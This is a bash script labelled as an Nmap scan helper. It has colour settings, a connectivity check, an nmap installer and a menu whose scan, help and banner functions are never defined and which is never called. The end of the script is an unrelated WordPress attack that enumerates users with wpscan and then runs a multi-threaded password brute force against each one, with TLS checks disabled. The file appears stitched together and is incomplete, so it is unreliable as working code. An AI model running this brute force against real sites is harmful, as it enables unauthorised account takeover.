#!/bin/bash

# Author: meepmaster
# Date: 06-05-2022
# Description: Nmap scan


# Color variables 

RED="\033[1;31m"
GREEN="\033[1;32m"
NOCOLOR="\033[0m"

# Internet Connect

function connect() {
	ping -c 1 -w 3 google.com > /dev/null 2>&1																
	if [ "$?" != 0 ];then
		echo -e "\n${RED}[!]${NOCOLOR} ${GREEN}This script needs an active internet connection!${NOCOLOR}"
		exit 1
	fi
}

function app_install () {

# Nmap installation	

	if [ ! -x "$(command -v nmap)" ];then																	
        echo -e "${RED}[+]${NOCOLOR} ${GREEN}Nmap not detected...Installing${NOCOLOR}"
        sudo apt-get install nmap -y > installing;rm installing
		else
    	echo -e "\n${GREEN}[+]${NOCOLOR}Nmap detected"
	fi
}

function menu () {
    echo -e ""
    echo -e "${GREEN}[?]${NOCOLOR} Scan type"
    echo -e ""
    echo -e "${GREEN}1${NOCOLOR} Fast Scan"
    echo -e "${GREEN}2${NOCOLOR} Intense Scan"
    echo -e ""
    echo -e "${GREEN}3${NOCOLOR} Check/Install Dependencies"
    echo -e "${GREEN}4${NOCOLOR} Help"
    echo -e ""
	echo -e "${GREEN}0${NOCOLOR} Exit/Quit"
    echo -e ""
    echo -e "${GREEN} Select one : ${NOCOLOR}\n"
	read meno;
    echo -e ""
    
    if [ $meno = 1 ]
    then
        nmap_ports_open_fast
    elif [ $meno = 2 ]
    then
        nmap_ports_open_intense
    elif [ $meno = 3 ]
    then
        app_install
    elif [ $meno = 4 ]
    then
        help
	elif [ $meno = 0 ]
    then
        banner
		echo -e "\n${GREEN} Nice to meet you, Bye...${NOCOLOR}\n";sleep 2
	exit		
    else
		banner
		echo -e "\n${GREEN} Wrong option, Bye...${NOCOLOR}\n";sleep 2
	exit
    fi

	menu
}

# Set the target WordPress URL
TARGET_URL="http://example.com"

# Set the path to the wordlist containing passwords
PASSWORDLIST="/path/to/passwordlist.txt"

# Perform user enumeration
echo "Performing user enumeration..."
wpscan --url $TARGET_URL --enumerate u > user_enum.txt

# Extract usernames from the user enumeration result
USERLIST=$(grep 'Username:' user_enum.txt | awk '{print $2}')

# Perform brute force attack for each username
for USERNAME in $USERLIST; do
    echo "Performing brute force attack for user: $USERNAME..."
    wpscan --url $TARGET_URL --passwords $PASSWORDLIST --user $USERNAME --max-threads 50 --disable-tls-checks --max-retries 3 --retry-connrefused --output brute_force_result_$USERNAME.txt
done

echo "Done."
